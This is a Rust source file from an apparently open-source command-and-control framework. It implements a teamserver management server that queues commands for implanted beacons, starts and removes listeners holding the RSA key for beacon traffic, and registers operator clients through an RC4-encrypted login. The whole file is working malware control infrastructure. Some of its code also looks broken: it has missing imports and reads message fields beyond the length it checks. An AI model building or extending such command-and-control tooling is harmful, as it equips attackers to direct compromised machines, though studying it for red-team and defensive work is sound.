// Copyright (c) 2024 ThottySploity

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

// use crate::utilities::beacondecoder::BeaconDecoder;
use crate::webserver::{QUEUE, TEAMCLIENT, Teamclient, endpoints::*, endpoints::listeners::Listeners};
use crate::utilities::beacondecoder::BeaconDecoder;

use log::{debug, info};
use actix_web::{web, HttpResponse, HttpServer, App};
use crate::encryption::rc4::Rc4;


pub struct ManagementServer;

impl ManagementServer {
    pub async fn start(ip: String, port: u64, username: String, password: String, key: String, private_key: RsaPrivateKey) -> std::io::Result<()> {
        // Management side of Webserver

        info!("Starting management server on: {}:{}", ip, port);

        HttpServer::new(move || {
            App::new()
                .app_data(web::Data::new(username.clone()))
                .app_data(web::Data::new(password.clone()))
                .app_data(web::Data::new(key.as_bytes().to_vec()))
                .app_data(web::Data::new(private_key.clone()))

                .route("/mgmt/{api}", web::post().to(handle_mgmt_call))
                .route("/register/{key}", web::post().to(handle_register_call))
        })
        .bind(&format!("{}:{}", ip, port))?
        .run()
        .await
    }
}

async fn handle_mgmt_call(api: web::Path<String>, body: String, key: web::Data<Vec<u8>>, private_key: web::Data<RsaPrivateKey>) -> HttpResponse {
    // The management function covers everything from starting new HTTP listeners to issueing commands to beacons
    // This function works in a REST API fashion.

    match api.as_str() {
        "queue" => {
            // Queueing a job for a beacon
            if let Ok(command) = retrieve_command_teamclient(body, key.get_ref().clone()) {
                if let Ok(mut queue) = QUEUE.lock() {
                    let beacon = BeaconDecoder::new(command.clone());
                
                    debug!("Added a command for beacon: {}", beacon.id());
                    queue.commands.push((beacon.id(), beacon.res()));
                    debug!("Length of queue: {}", queue.commands.len());
                    
                    let encoded_teamclient_json = encode_in_json(command, format!("Added job for: {}, Length of queue is now: {}", beacon.id(), queue.commands.len()));
                    let payload = format_teamclient_payload(encoded_teamclient_json, key.get_ref().clone());
                    return HttpResponse::Ok().body(payload)
                }
            }
        },
        "listener" => {
            // Adding, removing and getting the active listeners on the teamserver
            
            if let Ok(command) = retrieve_command_teamclient(body, key.get_ref().clone()) {
                let msg: Vec<&str> = command.split(":").collect();
                if msg.len() >= 1 {
                    let method = msg[0].to_string();
                    
                    match method.as_str() {
                        "add" => {
                            // Adding a listener to the teamserver
                            // The private key serves so that the beacons can encrypt with the teamserver public key
                            // And the teamserver can decrypt beacon messages.
                            
                            if let Ok(res) = Listeners::handle_listener_start(command.clone(), private_key.get_ref().clone()).await {
                                let encoded_teamclient_json = encode_in_json(command.clone(), res);
                                let payload = format_teamclient_payload(encoded_teamclient_json, key.get_ref().clone());
                                return HttpResponse::Ok().body(payload);
                            }
                        },
                        "remove" => {
                            // Removing a listener from the teamserver
                            if Listeners::handle_listener_remove(command).await {
                                return HttpResponse::Ok().into();
                            }
                        },
                        "get" => {
                            // Getting all active listeners
                            if let Ok(list) = Listeners::handle_listener_get().await {
                                // List needs to be encrypted
                                let encoded_json = encode_in_json(command.clone(), list);
                                let payload = format_teamclient_payload(encoded_json, key.get_ref().clone());
                                return HttpResponse::Ok().body(payload);
                            }
                        },
                        _ => return HttpResponse::NotFound().into(),
                    };
                }
            }
        },
        _ => return HttpResponse::NotFound().into(),
    };

    HttpResponse::NotFound().into()
}

async fn handle_register_call(action: web::Path<String>, body: String, username: web::Data<String>, password: web::Data<String>, key: web::Data<Vec<u8>>) -> HttpResponse {
    match action.as_str() {
        "auth" => {
            // Teamclient sends a msg to this endpoint with a predefined RC4 key

            let decoded_encrypted = Base64::decode(&body);
            let decrypted_body = Rc4::crypt(decoded_encrypted, key.get_ref().clone());
            
            if let Ok(plaintext) = std::str::from_utf8(&decrypted_body) {
                let msg: Vec<&str> = plaintext.split("&").collect();

                if msg.len() >= 2 {
                    let req_username = msg[0].to_string();
                    let req_password = msg[1].to_string();
                    let req_host = msg[2].to_string();
                    let req_port = msg[3].to_string();
                    let req_endpoint = msg[4].to_string();

                    if req_username == format!("username={}", username.get_ref().clone()) 
                    && req_password == format!("password={}", password.get_ref().clone())
                    {
                        let teamclient = Teamclient::new(req_host, req_port, req_endpoint);

                        if let Ok(mut teamclients) = TEAMCLIENT.lock() {
                            teamclients.clients.push(teamclient);
                        }

                        let encrypted_resp = Rc4::crypt(format!("Added").as_bytes().to_vec(),key.get_ref().clone());
                        let encoded = Base64::encode(&encrypted_resp);
                        return HttpResponse::Ok().body(encoded);
                    }
                }
            }
        },
        _ => return HttpResponse::NotFound().into(),
    };


    HttpResponse::NotFound().into()
}
